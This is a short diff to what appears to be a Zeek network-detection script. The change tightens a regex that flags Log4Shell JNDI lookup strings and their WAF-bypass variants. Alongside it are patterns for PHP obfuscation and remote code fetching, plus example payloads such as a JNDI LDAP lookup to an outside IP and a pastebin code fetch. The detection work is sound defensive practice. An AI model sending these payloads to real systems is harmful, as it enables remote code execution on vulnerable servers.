@@ -57,7 +57,7 @@ export {
     /(str_replace[[:space:]]*?\+*?\()/i |
     /(file_get_contents[[:space:]]*?\+*?\()/i | #Example: $code = file_get_contents('https://pastebin[.]com/raw/63LjCNAs');
     /(PHP Obfuscator)/ |
-    /\$\{.*j.*?n.*?d.*?i.*?\:.*\/\/.*\}/i | # Based on https://nakedsecurity.sophos.com/2021/12/10/log4shell-java-vulnerability-how-to-safeguard-your-servers/ and Tweets about WAF bypasses.
+    /\$\{.*?j.*?n.*?d.*?i.*?\:.*\/\/.*\}/i | # Based on https://nakedsecurity.sophos.com/2021/12/10/log4shell-java-vulnerability-how-to-safeguard-your-servers/ and Tweets about WAF bypasses.
     #   Examples:
     #   ua_list=[
     #   "${jndi:ldap://192.168.2.210/a}",
